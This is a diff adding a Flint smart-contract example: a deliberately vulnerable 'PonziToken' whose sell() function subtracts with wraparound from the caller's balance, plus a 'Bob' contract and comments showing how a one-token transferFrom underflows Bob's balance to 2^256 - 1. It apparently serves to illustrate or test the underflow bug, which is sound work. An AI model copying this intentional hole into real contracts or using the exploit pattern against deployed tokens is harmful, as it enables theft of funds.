@@ -1,0 +1,75 @@
+// Explicitly overflowing / vulnerable PonziToken in flint
+
+contract PonziToken {
+    var balances: [Address: Int] = [:]
+    var allowed: [Address: [Address: Int]] = [:]
+    var totalSupply: Int = 0
+    let deployedAddress: Address
+}
+
+PonziToken :: (any) {
+  public init(at: Address) {
+    deployedAddress = at
+  }
+}
+
+PonziToken :: caller <- (any) {
+  public func transferFrom(from: Address, to: Address, value: Int) -> Bool
+    mutates (allowed, totalSupply, balances)
+  {
+    let allowance: Int = allowed[from][caller]
+    assert(allowance >= value)
+    allowed[from][caller] -= value
+
+    transferTokens(from: from, to: to, value: value)
+
+    return true
+  }
+
+  func transferTokens(from: Address, to: Address, value: Int)
+    mutates (totalSupply, balances)
+  {
+    assert(balances[from] >= value)
+    if to == deployedAddress {
+      sell(amount: value)
+    }
+		// Omitted as not relevant to vulnerability
+  }
+
+  func sell(amount: Int)
+    mutates (totalSupply, balances)
+  {
+    // remove tokens
+    totalSupply -= amount
+    // Explitly allow overflow here
+    balances[caller] = balances[caller] &- amount
+  }
+}
+
+// Assuming:
+// - Bob has a balance of 0
+// - Claire has a balance of 1
+// - Bob is allowed to transfer 1 from Claire
+
+// When Bob calls transferFrom(claire, ponziToken, 1)
+// transferTokens(claire, ponziToken, 1) is called
+// Which then calls sell(1)
+// sell(1) updates the balances[bob] which equals 0 to -1 leading to 2^256 - 1
+// as the current balance of bob.
+contract Bob {
+  let ponziToken: Address
+  let claire: Address
+}
+
+Bob :: (any) {
+  public init(target: Address, proxy: Address) {
+    ponziToken = target
+    claire = proxy
+  }
+
+  public func exploit()
+    mutates (PonziToken.allowed, PonziToken.totalSupply, PonziToken.balances)
+  {
+    transferFrom(claire, ponziToken, 1)
+  }
+}
